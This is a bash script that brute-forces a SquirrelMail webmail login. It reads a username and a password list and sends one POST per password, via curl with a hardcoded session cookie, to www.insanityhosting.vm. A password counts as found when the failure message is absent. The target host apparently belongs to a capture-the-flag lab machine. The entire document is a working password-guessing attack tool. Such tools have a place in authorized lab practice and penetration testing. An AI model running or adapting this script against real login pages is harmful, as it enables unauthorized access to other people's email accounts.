#!/bin/bash -x

if [ $# -lt 2 ]
then
	echo "Wrong number of arguments. Usage:"
	echo "	$0 user password_list_file"
	exit 1
fi

user=$1
passwordfile=$2

while read password;
do
	echo "trying $user / $password"
	databinary=$(echo "login_username=$user&secretkey=$password&js_autodetect_results=1&just_logged_in=1")

 	curl -i -s -k \
	-X "POST" \
    	-H "Host: www.insanityhosting.vm" \
	-H "Content-Length: 80" \
	-H "Cache-Control: max-age=0" \
	-H "Upgrade-Insecure-Requests: 1" \
	-H "Origin: http://www.insanityhosting.vm" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36" \
	-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
	-H "Referer: http://www.insanityhosting.vm/webmail/src/login.php" \
	-H "Accept-Encoding: gzip, deflate" \
	-H "Accept-Language: en-US,en;q=0.9" \
	-H "Connection: close" \
    -b "SQMSESSID=tatissdp5jq197v27bk3glmhh6" \
    --data-binary $databinary \
	--output curloutput.txt \
    	"http://www.insanityhosting.vm/webmail/src/redirect.php"

	numlines=$(cat curloutput.txt | grep "Unknown user or password incorrect" | wc -l)
	echo "numero de lineas: $numlines"

	if [ $numlines -eq 0 ]
	then
		echo found: user $user, password $password
		exit 0
	fi

done < $passwordfile

echo no password found for user $user in file $passwordfile
exit 1
